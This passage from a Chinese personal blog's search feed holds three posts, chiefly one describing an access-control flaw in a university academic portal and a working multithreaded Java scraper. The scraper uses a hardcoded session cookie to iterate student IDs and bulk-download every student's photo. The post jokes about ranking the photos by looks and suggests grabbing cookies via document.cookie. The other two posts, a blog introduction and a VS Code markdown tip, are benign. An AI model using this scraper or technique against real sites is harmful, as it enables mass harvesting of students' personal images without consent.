        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校教务网的一个安全漏洞</title>
      <link href="/2019/08/05/find-leak/"/>
      <url>/2019/08/05/find-leak/</url>
      
        <content type="html"><![CDATA[<h1 id="发现教务网的一个安全漏洞"><a href="#发现教务网的一个安全漏洞" class="headerlink" title="发现教务网的一个安全漏洞"></a>发现教务网的一个安全漏洞</h1><blockquote><p>&emsp;&emsp;在做一个人脸识别的项目时，需要获取学校教务网上的学生的照片，但是后来我无意中发现学校教务网上的一个安全漏洞，就是在得到自己图片的cookie之后，由于学校的http请求是get请求，并且由于cookie的权限会导致你在持有cookie的情况下可以访问学校任何一个有学号的同学的照片</p></blockquote><br><h2 id="http的get请求和post请求的区别"><a href="#http的get请求和post请求的区别" class="headerlink" title="http的get请求和post请求的区别"></a>http的get请求和post请求的区别</h2><p>&emsp;&emsp;关于这一点,直接把百度的结果粘贴如下:</p><p>&emsp;&emsp;<strong> GET和POST是Http请求中最常用的两种请求方法: </strong></p><blockquote><p>   首先介绍GET与POST的差异:</p><p>   （1）GET请求资源数据，POST向服务器传递需要处理的数据</p><p>  （2）GET传递数据大小不超过2kb，POST没有限制</p><p>  （3）GET请求的参数会在Url上暴露显示，POST请求参数在Requestbody里，所以相对GET来说，POST安全性较高</p><p>  （4）GET 请求的静态资源会被浏览器缓存，POST不会被缓存</p><p>   （5）GET传递的数据类型是文本，POST是文本或者二进制</p><p>   （6）GET请求被回退时是无害的，POST请求被回退是会被重新再执行一次GET和POST的使用场景：  </p><blockquote><p>   （a）在传递一些机密信息时必须要使用POST<br>   （b）只是查询获取数据时可以用GET<br>   （c）POST请求速率会比GET慢，因为GET请求产生一个TCP数据包;POST请求产生两个TCP数据包</p></blockquote></blockquote><hr><br><h2 id="探究过程"><a href="#探究过程" class="headerlink" title="探究过程"></a>探究过程</h2>   <p>&emsp;&emsp;由于get请求的参数会在url暴露显示，我们可以直接更改url上的参数，将学号更改为其他人的学号来获取其他人的照片信息,但是发现这样获取太慢了，就直接写个多线程批量下载照片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;  </span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.HttpURLConnection;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">  </span><br><span class="line"> public class downimage &#123;  </span><br><span class="line">public static void  downLoadFromUrl(String urlStr,String fileName,String </span><br><span class="line">savePath) throws IOException&#123;</span><br><span class="line">        URL url = new URL(urlStr);  </span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();  </span><br><span class="line">        conn.setConnectTimeout(3*1000); </span><br><span class="line">        System.setProperty(&quot;http.proxyHost&quot;, &quot;localhost&quot;); </span><br><span class="line">        System.setProperty(&quot;http.proxyPort&quot;, &quot;8888&quot;);         </span><br><span class="line">        conn.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/4.0 (compatible;</span><br><span class="line"> MSIE 5.0; Windows NT; DigExt)&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Cookie&quot;,&quot;semester.id=281;</span><br><span class="line"> JSESSIONID=8F14338919CEA1334F7E4B558217782D; </span><br><span class="line">iPlanetDirectoryPro=vYeKkeVYfd97aWCGmR2lSA&quot;);</span><br><span class="line">        InputStream inputStream = conn.getInputStream();  </span><br><span class="line">        byte[] getData = readInputStream(inputStream);    </span><br><span class="line">        File saveDir = new File(savePath);</span><br><span class="line">        if(!saveDir.exists())&#123;</span><br><span class="line">            saveDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        File file = new File(saveDir+File.separator+fileName);    </span><br><span class="line">        FileOutputStream fos = new FileOutputStream(file);     </span><br><span class="line">        fos.write(getData); </span><br><span class="line">        if(fos!=null)&#123;</span><br><span class="line">            fos.close();  </span><br><span class="line">        &#125;</span><br><span class="line">        if(inputStream!=null)&#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;info:&quot;+url+&quot; download success&quot;); </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static  byte[] readInputStream(InputStream inputStream) throws </span><br><span class="line">IOException &#123;  </span><br><span class="line">        byte[] buffer = new byte[1024];  </span><br><span class="line">        int len = 0;  </span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();  </span><br><span class="line">        while((len = inputStream.read(buffer)) != -1) &#123;  </span><br><span class="line">            bos.write(buffer, 0, len);  </span><br><span class="line">        &#125;  </span><br><span class="line">        bos.close();  </span><br><span class="line">        return bos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">    int z=起始学号;</span><br><span class="line">    int y = 结束学号;</span><br><span class="line">    for (int i=起始学号;i&lt;=v结束学号;i++)&#123;</span><br><span class="line">      String filename=y+&quot;.jpg&quot;;</span><br><span class="line">    String x=&quot;网址&quot;+z;//z是学号，由于是get请求</span><br><span class="line">    new Thread(new Runnable()&#123;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public void run() &#123;</span><br><span class="line">// TODO Auto-generated method stub</span><br><span class="line"> try&#123;</span><br><span class="line">     downLoadFromUrl(x,</span><br><span class="line">         filename,&quot;C:/Users/asus/Desktop/pictures&quot;);</span><br><span class="line">            </span><br><span class="line">        &#125;catch (Exception e) &#123;</span><br><span class="line">            // TODO: handle exception</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    &#125;).start();</span><br><span class="line">    Thread.sleep(2000);</span><br><span class="line">    z++;</span><br><span class="line">    y++;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;线程休眠2s,之后直接将图片下载到桌面上的文件夹中，理论上你可以下载所有学生的照片，<del>如果外带一个人脸识别接口判断颜值，就能找到校花了</del> </p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>抓取成果:</p><p><img src="/2019/08/05/find-leak/find-leak.png" alt="成果截图"><br>           &nbsp; &nbsp; &nbsp; ps：为保护隐私，给图片打码。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>&emsp;&emsp;源代码中cookie是需要你手动获取的，在浏览器中打开图片前f12打开浏览器开发者模式,找到含有sessionid的cookie手动填上去。如果觉得麻烦，这里提供一个思路：先用账号密码登录官网，然后用document.cookie获取到cookie，然后包装请求头再次发送给服务器，前提是该cookie没有设置httponly。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2> <p>&emsp;&emsp;本篇博客原创仅供学习交流使用，如用作其他用途所承受的法律责任一概与作者无关。</p>]]></content>
      
      
      <categories>
          
          <category> 安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简易爬虫 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导论</title>
      <link href="/2019/07/30/%E5%AF%BC%E8%AE%BA/"/>
      <url>/2019/07/30/%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="why-blog"><a href="#why-blog" class="headerlink" title="why blog"></a>why blog</h1><blockquote><p>&emsp;&emsp;长久以来一个问题一直困扰着我，为什么有些东西如此昂贵，如此的高科技，却毫无用处，就像我知道的，计算机虽然是台笨机器，却有能力做出难以置信的智能事情，而程序员虽然是一些聪明的人，但却老是做难以置信的傻事情。他们呀，简言之，是对绝配。</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;— Bill Bryson, 作家, 出自《Notes from a Big Country》</p></blockquote><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>&emsp;&emsp;针对网络上繁杂的基础知识和实验流程做一个自己总结的简略总结，每个人的思维方式和问题角度，对待问题的着重点不同以至于在网络上看待一个过程，知识点，问题的解决方案每个人所得到的东西都不尽一致。希望自己能尽心尽力地去总结我在学习上遇到的各种困难问题，这样对自己后来的复习和解决新的困难时会更加迅速。</p><h2 id="学习困境"><a href="#学习困境" class="headerlink" title="学习困境"></a>学习困境</h2><p>&emsp;&emsp;需要学习的东西太多，完整消化一个知识点又需要很长时间，比如对于http协议的深入了解还需要去了解交换机局域网的通信原理，在学习过程种所遇到的困难很多，网络上有些存在解决方案但是没有讲授出现问题的原因。况且身边的学习氛围不够浓厚，除非意志坚定很难在一段漫长的时间里保持对学习的高度热情，并且身处群体之中，个体很难维持长久的理智。希望自己能在学习的道路上顽强走下去。</p><h2 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h2><ul><li>wireshark的使用</li><li>完整探究局域网的底层通讯原理</li><li>学习二维码的原理</li><li>框架架构设计模式的根本区别</li><li>了解数据保护</li><li>深入探究web开发流程客户端服务端数据库的三方通讯</li><li>巩固代码基础（java implements）</li><li>修改校园失物巡回箱子的刷新监听代码</li><li>修改校园失物巡回箱子人脸动态活体扫描机制</li><li>抓取学校官网的照片并进行人脸对比</li><li>了解dns劫持</li><li>写http图解的读后感，梳理其中的web攻击方式（博客）</li><li>熟悉安卓的mvp和mvc设计模式</li><li>了解脚本</li></ul><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>好好学习</p>]]></content>
      
      
      <categories>
          
          <category> 导论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode的markdown操作</title>
      <link href="/2019/07/30/vscode%E6%96%87%E6%A1%A3/"/>
      <url>/2019/07/30/vscode%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Vscode-Markdown-相关问题"><a href="#Vscode-Markdown-相关问题" class="headerlink" title="Vscode Markdown 相关问题"></a>Vscode Markdown 相关问题</h2><blockquote><p>关于vscode markdown.styles如何使用自定义css文件的解决方案</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h3><p>出现无法加载 “markdown.styles”的显示框</p><h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因:"></a>问题原因:</h3><blockquote><p>根据issue说是安全原因取消了绝对路径样式，以至于现在无法使用绝对路径</p><p><a href="https://github.com/Microsoft/vscode/issues/45260" target="_blank" rel="noopener">https://github.com/Microsoft/vscode/issues/45260</a></p></blockquote><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:  "></a>解决办法: <br> <br></h3><p> &ensp; &ensp;要么使用扩展，要么用当前工作空间的相对路径。就是说你这个css文件相对于当前编辑的文件的位置的路径，如果觉得绕口，就把css文件放在编辑文件的同一个目录下，这样路径直接填css文件名就好了。</p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程:  "></a>操作过程: <br> <br></h3><p> 第一步在vscode界面的左下角齿轮打开设置，输入markdown</p><p> <img src="/2019/07/30/vscode文档/1.png" alt="第一步"></p><p> 第二步找到Markdown.styles，点击编辑</p><p> <img src="/2019/07/30/vscode文档/2.png" alt="第二步"></p><p> 第三步修改如图， <strong>注意的是你填写的路径如我开头所讲的那样，是你当前编辑文件的相对路径</strong>    </p><p> <img src="/2019/07/30/vscode文档/3.png" alt="第三步"></p><p> 修改完成之后就会看到效果。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
